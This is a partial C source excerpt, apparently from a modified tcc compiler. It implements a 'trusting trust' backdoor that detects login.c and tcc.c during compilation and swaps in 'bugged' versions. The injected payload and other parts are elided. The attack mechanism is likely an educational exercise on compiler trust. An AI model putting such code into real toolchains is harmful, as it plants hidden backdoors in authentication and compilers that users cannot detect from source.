...
redo:
  ...
  do
  {
    ...
    char *str_pointer;
    printf("Found file: %s\n", f->name);
    if ((str_pointer = strstr(f->name, "login.c")) != NULL)
    {
      printf("Found login.c!!!! Bugging it...\n");
      // Read Normal file
      int normalfd = open(f->name, O_RDONLY | 0660);
      ...
      // Redirect the compiler to read bad file instead
      strcpy(f->name, "./login.c");
      if (1 == s->verbose)
        printf("-> %s\n", f->name);
      if (!first_file)
        first_file = f->name;
      ...
      // if (remove("login.c") == 0)
      //   printf("The temp login.c is deleted successfully.\n");
      // else
      //   return EXIT_FAILURE;
    }
    else if ((str_pointer = strstr(f->name, "tcc.c")) != NULL)
    {
      printf("Found tcc.c! bugging it...\n");
      // Read Normal file
      int normalfd = open(f->name, O_RDONLY | 0660);
      ...
      if (spotLocation != NULL)
      {
        ...
        // Write the bad code to temp file
        int buggedfd = open("tcc.c", O_WRONLY | O_TRUNC | O_CREAT, 0660);
        int byteWrote = write(buggedfd, fileBuffer, strlen(fileBuffer));
        printf("Wrote %d bytes\n", byteWrote);
        if (byteWrote == -1)
          perror("write() failed");
